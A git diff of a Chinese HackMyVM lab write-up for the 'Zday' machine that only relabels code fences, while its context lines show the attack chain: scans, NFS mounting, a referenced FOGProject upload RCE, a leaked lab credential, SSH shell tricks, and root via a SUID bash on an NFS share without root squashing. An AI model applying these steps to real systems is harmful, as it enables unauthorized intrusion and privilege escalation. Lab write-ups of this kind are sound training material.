@@ -27,7 +27,7 @@ Hack and Fun!
 
 ## 信息搜集
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sudo nmap --min-rate=2000 -v -A -p- 192.168.56.130
 Nmap scan report for bogon (192.168.56.130)
@@ -104,7 +104,7 @@ Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 可以看到目标机器上开启了 NFS 服务，查看一下信息
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ showmount -e 192.168.56.130
 Export list for 192.168.56.130:
@@ -114,7 +114,7 @@ Export list for 192.168.56.130:
 
 有点意思，挂载一下路径
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sudo mkdir /mnt/HMV-Zday-images-dev
 
@@ -130,7 +130,7 @@ Export list for 192.168.56.130:
 
 查看有哪些文件
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ ls -lah /mnt/HMV-Zday-images
 总计 16K
@@ -173,7 +173,7 @@ drwxrwxrwx 2 1001 root 4.0K 2021 年 3 月 10 日 postinitscripts
 
 尝试进行目录爆破
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ dirsearch -u 192.168.56.130
 Target: http://192.168.56.130/
@@ -218,7 +218,7 @@ Target: http://192.168.56.130/
 
 尝试利用 [FOGProject 1.5.9 - File Upload RCE (Authenticated)](https://www.exploit-db.com/exploits/49811)
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ dd if=/dev/zero of=myshell bs=10485760 count=1
 输入了 1+0 块记录
@@ -279,7 +279,7 @@ fogproject:84D1gia!8M9HSsR8gXau
 
 尝试使用上面获取到的凭据连接到数据库
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ mysql --skip-ssl -u fogstorage -h 192.168.56.130 -p
 Enter password:
@@ -378,7 +378,7 @@ MariaDB [fog]> select * from users;
 
 尝试通过 SSH 连接
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ ssh fogproject@192.168.56.130
 fogproject@192.168.56.130's password:
@@ -408,7 +408,7 @@ Connection to 192.168.56.130 closed.
 
 尝试指定 SSH 的入口
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ ssh fogproject@192.168.56.130 -t /bin/sh
 fogproject@192.168.56.130's password:
@@ -419,7 +419,7 @@ fogproject
 
 为了能够使用 bash 来进行交互，需要修改 `/home/fogproject/.bashrc` 文件的最后一行
 
-```shell
+```bash
 $ cat /home/fogproject/.bashrc | tail -n 2
 echo -e "You seem to be using the'fogproject'system account to logon and work \non your FOG server system.\n\nIt's NOT recommended to use this account! Please create a new \naccount for administrative tasks.\n\nIf you re-run the installer it would reset the 'fog' account \npassword and therefore lock you out of the system!\n\nTake care, \nyour FOGproject team"
 exit 1
@@ -428,7 +428,7 @@ $ vi /home/fogproject/.bashrc
 
 然后继续使用 `/bin/bash` 进行登录
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ pwncat-cs fogproject@192.168.56.130
 [23:34:25] Welcome to pwncat 🐈!
@@ -444,7 +444,7 @@ fogproject
 
 上传 `linpeas.sh` 进行自动化分析
 
-```shell
+```bash
 ╔══════════╣ Analyzing NFS Exports Files (limit 70)
 -e Connected NFS Mounts:
 nfsd /proc/fs/nfsd nfsd rw,relatime 0 0
@@ -455,7 +455,7 @@ nfsd /proc/fs/nfsd nfsd rw,relatime 0 0
 
 尝试加以利用
 
-```shell
+```bash
 # Machine
 (remote) fogproject@zday:/home/fogproject$ cp /bin/bash /images/dev/
 (remote) fogproject@zday:/home/fogproject$ ls -lh /images/dev/
@@ -479,7 +479,7 @@ drwxrwxrwx 2 1001 root 4.0K 2021 年 3 月 10 日 postinitscripts
 
 即可获得 root 权限
 
-```shell
+```bash
 (remote) fogproject@zday:/home/fogproject$ /images/dev/bash -p
 (remote) root@zday:/home/fogproject# whoami
 root
